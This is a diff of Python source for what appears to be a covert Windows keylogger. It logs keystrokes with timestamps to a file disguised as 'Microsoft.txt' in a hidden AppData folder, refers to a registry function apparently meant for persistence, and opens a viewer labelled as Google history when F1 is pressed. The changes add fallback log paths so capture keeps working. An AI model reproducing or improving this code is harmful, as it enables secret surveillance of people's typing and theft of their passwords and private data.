@@ -47,7 +47,7 @@ def regis():
     winreg.CloseKey(key)
 
 
-#regis()
+#regis() j
 
 def mostre():
     raiz = Tk()
@@ -55,17 +55,33 @@ def mostre():
     raiz.geometry("910x900")
     raiz.title("INFORMACION DE HISTORIAL DE GOOGLE")
 
-    filename = filedialog.askopenfilename(initialdir=f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt",filetypes=(("Archivos de texto de Microsoft", "Microsoft.txt"),))
+    if os.path.exists(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt"):
 
-    if filename:
-        scroll_bar = Scrollbar(raiz) 
-        scroll_bar.pack(side = RIGHT, fill = Y ) 
+        filename = filedialog.askopenfilename(initialdir=f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt",filetypes=(("Archivos de texto de Microsoft", "Microsoft.txt"),))
+        
+        if filename:
+            scroll_bar = Scrollbar(raiz) 
+            scroll_bar.pack(side = RIGHT, fill = Y ) 
+            
+            escritura = Text(raiz,width=9000,height=9000,bg="black",fg="yellow",font=("Georgia, 12"),yscrollcommand=scroll_bar.set)
+            
+            with open(filename,"rb") as g:
+                escritura.insert(END, g.read().decode())
+                scroll_bar.config(command=escritura.yview)
+            escritura.pack()
+    else:
+        filename = filedialog.askopenfilename(initialdir=f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow",filetypes=(("Archivos de texto de Microsoft", "Microsoft.txt"),))
+        
+        if filename:
+            scroll_bar = Scrollbar(raiz) 
+            scroll_bar.pack(side = RIGHT, fill = Y ) 
+            
+            escritura = Text(raiz,width=9000,height=9000,bg="black",fg="yellow",font=("Georgia, 12"),yscrollcommand=scroll_bar.set)
+            
+            with open(filename,"rb") as g:
+                escritura.insert(END, g.read().decode())
+                scroll_bar.config(command=escritura.yview)
 
-        escritura = Text(raiz,width=9000,height=9000,bg="black",fg="yellow",font=("Georgia, 12"),yscrollcommand=scroll_bar.set)
-
-        with open(filename,"rb") as g:
-            escritura.insert(END, g.read().decode())
-            scroll_bar.config(command=escritura.yview)
             escritura.pack()
     
 
@@ -77,7 +93,10 @@ def prisionaerros(key):
     try:
         hora = datetime.now()
         texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
-        txt = open(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt","a")#tenes que cambiar la ruta no te olvides de eso
+        try:
+            txt = open(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt","a")#tenes que cambiar la ruta no te olvides de eso
+        except FileNotFoundError:
+            txt = open(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Microsoft.txt","a")
 
         if key == keyboard.Key.f1:
             mostre()
